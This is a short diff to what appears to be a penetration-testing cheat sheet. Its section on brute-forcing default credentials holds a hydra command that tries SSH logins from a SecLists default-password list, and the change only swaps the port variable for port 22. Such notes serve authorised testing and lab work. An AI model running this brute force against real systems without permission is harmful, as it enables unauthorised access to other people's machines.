@@ -4,7 +4,7 @@
 
 ## Bruteforce default credentials
 ```bash
-hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://$hip -V -t 4 -I -s $hport
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://$hip -V -t 4 -I -s 22
 ```
 
 Or for a given user:
